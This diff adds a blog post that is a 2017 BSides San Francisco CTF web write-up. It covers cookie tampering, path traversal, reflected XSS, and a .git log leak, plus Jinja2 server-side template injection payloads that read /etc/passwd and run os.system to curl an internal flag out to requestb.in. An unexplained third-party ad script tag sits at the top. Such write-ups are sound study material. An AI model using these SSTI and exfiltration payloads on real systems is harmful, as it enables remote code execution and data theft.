@@ -1,0 +1,95 @@
+---
+layout:     post
+title:      "BSides San Francisco CTF"
+subtitle:   "Web Writeup"
+date:       2017-02-17 05:03:00
+author:     "Heeraj"
+header-img: "img/post-bg-02.png"
+---
+<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
+<p>The CTF was easy, especially the web ones. I will be discussing about zumbo 1,2,3, easy auth, the-year-2000 challenges. There was one more web challenge, Delphi status this can't be regarded as an web challenge, it was crypto challenge dealing with oracle padding attack. Lets start from the easiest challenge easy auth.</p>
+
+<h2 class="section-heading">Easy Auth</h2>
+<p>This challenge you have to change the cookie value. Change the value of username to administrator. You will get the flag. The <a href="https://scoreboard.ctf.bsidessf.com/attachment/cdbec071e3710a8465030f032d44e72ab2449098c9ad6597256087751d19bb39">source code</a> is available please check if you wish.</p>
+
+<a href="#">
+    <img src="{{ site.baseurl }}/img/Easy_auth.png" alt="Post Sample Image">
+</a>
+
+<h2 class="section-heading">Zumbo 1</h2>
+
+<p>The first challenge was easy challenge, When you see the source code of the challenge you can see the HTML comment.</p>
+
+<blockquote>
+&#x3C;!-- page: index.template, src: /code/server.py --&#x3E;
+</blockquote>
+
+<p>So you need to just go the url and you will see the source code of the challenge and the first flag.</p>
+
+<blockquote>
+http://zumbo-8ac445b1.ctf.bsidessf.net/server.py
+</blockquote>
+
+<a href="#">
+    <img src="{{ site.baseurl }}/img/zumbo1.png" alt="Post Sample Image">
+</a>
+
+<h2 class="section-heading">Zumbo 2</h2>
+
+<p>When you do get the source code of the challenge, you can understand that the you need to read an file at /flag location. You need to read the flag easily using a simple GET request.</p>
+
+<blockquote>
+curl http://zumbo-8ac445b1.ctf.bsidessf.net/..%2Fflag
+</blockquote>
+
+<p>Otherwise When you see in the source, our input is making change without any validation. That is you can get an Cross Site scripting.</p>
+
+<blockquote>
+http://zumbo-8ac445b1.ctf.bsidessf.net/%3Cscript%3Ealert('XSS')%3C/script%3E
+</blockquote>
+
+<p>But we can't do anything with the cross site scripting, we need to read the file. I was looking for way to read the file, since there is render engine and flask working definetly the next option in SSTI - Server Side Template Injection. Wow!! And it worked.</p>
+
+<blockquote>
+http://zumbo-8ac445b1.ctf.bsidessf.net/{{3+3}}
+</blockquote>
+
+<a href="#">
+    <img src="{{ site.baseurl }}/img/Zumbo2.png" alt="Post Sample Image">
+</a>
+
+<blockquote>
+http://zumbo-8ac445b1.ctf.bsidessf.net/index.template%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()%20%7D%7D
+</blockquote>
+
+<a href="#">
+    <img src="{{ site.baseurl }}/img/Zumbo.png" alt="Post Sample Image">
+</a>
+
+<h2 class="section-heading">Zumbo 3</h2>
+
+<p>Next challenge, you have to get the content of http://vault:8080/flag and this is an local service running on their server. We just have file reading capacity now, that means we are limited. We need to get more power, we want a shell. The problem I encountered was I was getting an shell, but the command were executed in their server and output was not printed on our screen. So I used requestb.in, for getting the flag.</p>
+
+<blockquote>
+http://zumbo-8ac445b1.ctf.bsidessf.net/server.py%7B%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%%7D%7B%%20if%20c.__name__%20==%20'catch_warnings'%20%%7D%7B%7Bc.__init__.func_globals['linecache'].__dict__['os'].system('curl%20http://vault:8080/flag|curl%20-T%20-%20http://requestb.in/1au6nde1')%20%7D%7D%20%7B%%20endif%20%%7D%20%7B%%20endfor%20%%7D
+</blockquote>
+
+<a href="#">
+    <img src="{{ site.baseurl }}/img/zumbo3.png" alt="Post Sample Image">
+</a>
+
+<h2 class="section-heading">the-year-2000</h2>
+
+<p>The homepage itself was conveying a lot of information, I did a directory traversal and checked the below link.</p>
+
+<blockquote>
+http://theyear2000.ctf.bsidessf.net/.git/logs/HEAD
+</blockquote>
+
+<a href="#">
+    <img src="{{ site.baseurl }}/img/the-year.png" alt="Post Sample Image">
+</a>
+
+<p>This challenge was very easy, you just need to get the old commit, may be you can see the <a href="https://github.com/bl4de/research/tree/master/hidden_directories_leaks">link</a> of <a href="https://twitter.com/_bl4de">@bl4de</a>, it talks about the extraction of hidden directory leaks. If you have any question, you can mail me.</p>
+
+<p>Thank you all</p>
